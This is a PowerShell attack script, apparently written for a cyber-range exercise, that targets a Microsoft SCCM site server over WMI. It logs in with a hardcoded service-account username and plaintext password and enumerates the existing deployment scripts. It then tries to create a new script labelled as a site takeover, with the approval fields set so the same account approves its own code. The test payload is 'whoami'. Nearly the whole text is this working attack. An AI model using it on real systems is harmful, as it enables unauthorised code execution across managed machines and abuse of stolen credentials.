$ErrorActionPreference = "Stop"
$opts = New-Object System.Management.ConnectionOptions
$opts.Username = 'range\svc_sccm'
$opts.Password = 's3rv1c3_SCCM!'
$opts.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy
$scope = New-Object System.Management.ManagementScope("\\mbr02.range.local\root\SMS\site_CAD", $opts)
$scope.Connect()

Write-Output "=== Existing SMS_Scripts instances ==="
$existing = Get-WmiObject -ComputerName mbr02.range.local -Credential (New-Object System.Management.Automation.PSCredential('range\svc_sccm',(ConvertTo-SecureString 's3rv1c3_SCCM!' -AsPlainText -Force))) -Namespace "root\SMS\site_CAD" -Class SMS_Scripts -ErrorAction SilentlyContinue
Write-Output "COUNT=$($existing.Count)"
foreach ($s in $existing) {
    Write-Output ("  Script: {0} | GUID={1} | Type={2} | Approval={3} | Version={4}" -f $s.ScriptName, $s.ScriptGuid, $s.ScriptType, $s.ApprovalState, $s.ScriptVersion)
}

Write-Output "=== CreateScripts InParameters detail ==="
$class = New-Object System.Management.ManagementClass($scope, "SMS_Scripts", $null)
foreach ($p in $class.Methods["CreateScripts"].InParameters.Properties) {
    Write-Output ("  PARAM {0} : {1} : Qualifiers=[{2}]" -f $p.Name, $p.Type, (($p.Qualifiers | ForEach-Object { "$($_.Name)=$($_.Value)" }) -join "; "))
}

Write-Output "=== Try CreateScripts ApprovalState=0 ==="
$in = $class.Methods["CreateScripts"].InParameters
$in["ScriptName"] = "CADRE-WT039-SiteTakeover"
$in["Script"] = "whoami"
$in["ScriptType"] = [uint32]1
$in["Timeout"] = [uint32]120
$in["ApprovalState"] = [uint32]0
$in["Approver"] = "range\svc_sccm"
$in["Author"] = "range\svc_sccm"
$in["ScriptDescription"] = "WT039"
$in["Comment"] = ""
$in["ParameterlistXML"] = ""
$in["ParamsDefinition"] = ""
$in["ScriptGuid"] = ""
$in["ScriptVersion"] = ""
try {
    $ret = $class.InvokeMethod("CreateScripts", $in, $null)
    Write-Output "RETURN=$($ret.ReturnValue) GUID=$($ret['ScriptGuid']) ID=$($ret['ScriptID'])"
    $ret | Out-String -Width 200
} catch {
    Write-Output "FAIL: $($_.Exception.Message)"
    if ($_.ErrorDetails) { Write-Output "DETAILS: $($_.ErrorDetails.Message)" }
}
Write-Output "DONE"
